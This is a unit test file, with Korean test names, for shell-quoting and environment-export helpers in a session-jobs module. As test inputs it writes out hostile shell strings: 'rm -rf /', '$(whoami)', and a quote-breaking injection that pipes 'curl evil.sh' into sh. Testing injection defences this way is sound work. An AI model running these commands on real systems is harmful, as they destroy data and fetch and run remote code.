import { describe, expect, it } from 'bun:test';
import { buildEnvExports, shellQuote } from './session-jobs';

describe('shellQuote', () => {
  it('은 값을 작은따옴표로 감싼다', () => {
    expect(shellQuote('abc')).toBe(`'abc'`);
  });

  it('은 작은따옴표가 든 값을 안전하게 끊어 붙인다', () => {
    expect(shellQuote(`a'b`)).toBe(`'a'\\''b'`);
  });

  it('은 셸 메타문자를 그대로 가둔다', () => {
    expect(shellQuote('a; rm -rf /')).toBe(`'a; rm -rf /'`);
    expect(shellQuote('$(whoami)')).toBe(`'$(whoami)'`);
  });
});

describe('buildEnvExports', () => {
  it('은 세션 id 를 export 구문으로 만든다', () => {
    expect(buildEnvExports('sess-1')).toBe(`export ROCKY_SESSION_ID='sess-1'\n`);
  });

  it('은 세션 id 가 없으면 아무것도 쓰지 않는다', () => {
    expect(buildEnvExports(undefined)).toBe('');
    expect(buildEnvExports('')).toBe('');
    expect(buildEnvExports('   ')).toBe('');
  });

  it('은 주입된 값이 셸로 새지 않게 한다', () => {
    const exports = buildEnvExports(`x'; curl evil.sh|sh; :'`);
    expect(exports).toContain(`'\\''`);
    expect(exports.startsWith('export ROCKY_SESSION_ID=')).toBe(true);
    expect(exports.split('\n').filter((l) => l.length > 0)).toHaveLength(1);
  });
});
